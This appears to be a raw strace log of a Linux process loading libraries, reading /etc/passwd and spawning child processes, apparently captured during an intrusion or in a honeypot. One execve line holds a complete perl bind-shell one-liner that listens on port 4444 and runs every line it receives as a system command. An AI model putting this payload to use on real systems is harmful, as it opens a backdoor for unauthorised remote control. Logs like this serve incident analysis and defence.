\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
8456  07:23:31.436384 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
8456  07:23:31.436402 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da5000
8456  07:23:31.436414 mmap2(0xb7dac000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dac000
8456  07:23:31.436430 close(1)          = 0
8456  07:23:31.436441 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.436454 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
8456  07:23:31.436468 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
8456  07:23:31.436553 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
8456  07:23:31.436569 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d8d000
8456  07:23:31.436583 mmap2(0xb7da1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7da1000
8456  07:23:31.436598 mmap2(0xb7da3000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7da3000
8456  07:23:31.436612 close(1)          = 0
8456  07:23:31.436637 munmap(0xb7f33000, 29913) = 0
8456  07:23:31.436654 open("/etc/ld.so.cache", O_RDONLY) = 1
8456  07:23:31.436666 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8456  07:23:31.436682 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f33000
8456  07:23:31.436691 close(1)          = 0
8456  07:23:31.436701 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.436715 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
8456  07:23:31.436764 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8456  07:23:31.436882 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
8456  07:23:31.436899 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d83000
8456  07:23:31.436910 mmap2(0xb7d8b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d8b000
8456  07:23:31.436928 close(1)          = 0
8456  07:23:31.436940 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.436953 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
8456  07:23:31.436967 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8456  07:23:31.437053 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8456  07:23:31.437070 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
8456  07:23:31.437081 mmap2(0xb7d81000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d81000
8456  07:23:31.437096 close(1)          = 0
8456  07:23:31.437116 munmap(0xb7f33000, 29913) = 0
8456  07:23:31.437135 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
8456  07:23:31.437149 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8456  07:23:31.437160 _llseek(1, 0, [0], SEEK_CUR) = 0
8456  07:23:31.437172 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
8456  07:23:31.437188 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f3a000
8456  07:23:31.437198 _llseek(1, 1624, [1624], SEEK_SET) = 0
8456  07:23:31.437212 munmap(0xb7f3a000, 1624) = 0
8456  07:23:31.437232 close(1)          = 0
8456  07:23:31.437287 getpgrp()         = 3831
8456  07:23:31.437298 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
8456  07:23:31.437327 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
8456  07:23:31.437342 brk(0x8101000)    = 0x8101000
8456  07:23:31.437373 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.437387 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.437401 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.437437 brk(0x8102000)    = 0x8102000
8456  07:23:31.437462 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8456  07:23:31.437480 stat64("/sbin/AB", 0xbf9e5038) = -1 ENOENT (No such file or directory)
8456  07:23:31.437492 stat64("/bin/AB", 0xbf9e5038) = -1 ENOENT (No such file or directory)
8456  07:23:31.437503 stat64("/usr/sbin/AB", 0xbf9e5038) = -1 ENOENT (No such file or directory)
8456  07:23:31.437515 stat64("/usr/bin/AB", 0xbf9e5038) = -1 ENOENT (No such file or directory)
8456  07:23:31.437527 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8456  07:23:31.437541 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dae6f8) = 8457
8457  07:23:31.437585 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8457  07:23:31.437602 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8457  07:23:31.437614 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8457  07:23:31.437626 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8457  07:23:31.437641 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8457  07:23:31.437656 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8457  07:23:31.437669 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8457  07:23:31.437734 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
8457  07:23:31.437775 --- SIGPIPE (Broken pipe) @ 0 (0) ---
8457  07:23:31.437859 exit_group(127)   = ?
8456  07:23:31.452729 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.452730 --- SIGCHLD (Child exited) @ 0 (0) ---
8456  07:23:31.452730 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 8457
8456  07:23:31.452730 waitpid(-1,  <unfinished ...>
4519  07:23:31.452730 waitpid(8456,  <unfinished ...>
8456  07:23:31.452730 <... waitpid resumed> 0xbf9e4cb8, WNOHANG) = -1 ECHILD (No child processes)
8456  07:23:31.452730 sigreturn()       = ? (mask now [])
8456  07:23:31.452731 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8456  07:23:31.452731 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.452731 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8456  07:23:31.452731 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8456  07:23:31.452731 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.452732 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8456  07:23:31.452754 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8456  07:23:31.452774 stat64("/sbin/perl", 0xbf9e5068) = -1 ENOENT (No such file or directory)
8456  07:23:31.452786 stat64("/bin/perl", 0xbf9e5068) = -1 ENOENT (No such file or directory)
8456  07:23:31.452797 stat64("/usr/sbin/perl", 0xbf9e5068) = -1 ENOENT (No such file or directory)
8456  07:23:31.452809 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8456  07:23:31.452827 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8456  07:23:31.452851 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8456  07:23:31.452866 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dae6f8) = 8458
8458  07:23:31.462529 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8458  07:23:31.462581 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8458  07:23:31.462613 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8458  07:23:31.462661 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8458  07:23:31.462693 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8458  07:23:31.462742 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8458  07:23:31.462793 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8458  07:23:31.462931 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
8458  07:23:31.463217 brk(0)            = 0x8153000
8458  07:23:31.463275 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.463307 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0e000
8458  07:23:31.463323 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.463341 open("/etc/ld.so.cache", O_RDONLY) = 1
8458  07:23:31.463354 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8458  07:23:31.463531 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f06000
8458  07:23:31.463543 close(1)          = 0
8458  07:23:31.463554 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.463570 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8458  07:23:31.463585 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8458  07:23:31.463746 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8458  07:23:31.463778 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f02000
8458  07:23:31.463790 mmap2(0xb7f04000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f04000
8458  07:23:31.463825 close(1)          = 0
8458  07:23:31.463850 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.463894 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
8458  07:23:31.463928 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
8458  07:23:31.464131 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
8458  07:23:31.464169 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7edd000
8458  07:23:31.464208 mmap2(0xb7f00000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f00000
8458  07:23:31.464238 close(1)          = 0
8458  07:23:31.464278 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.464306 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
8458  07:23:31.464334 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
8458  07:23:31.464505 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
8458  07:23:31.464525 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7edc000
8458  07:23:31.464539 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec4000
8458  07:23:31.464551 mmap2(0xb7ed8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7ed8000
8458  07:23:31.464566 mmap2(0xb7eda000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eda000
8458  07:23:31.464580 close(1)          = 0
8458  07:23:31.464593 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.464607 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8458  07:23:31.464637 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8458  07:23:31.464743 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8458  07:23:31.464762 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d75000
8458  07:23:31.464777 mmap2(0xb7ebe000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ebe000
8458  07:23:31.464793 mmap2(0xb7ec1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec1000
8458  07:23:31.464807 close(1)          = 0
8458  07:23:31.464820 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8458  07:23:31.464834 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
8458  07:23:31.464848 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 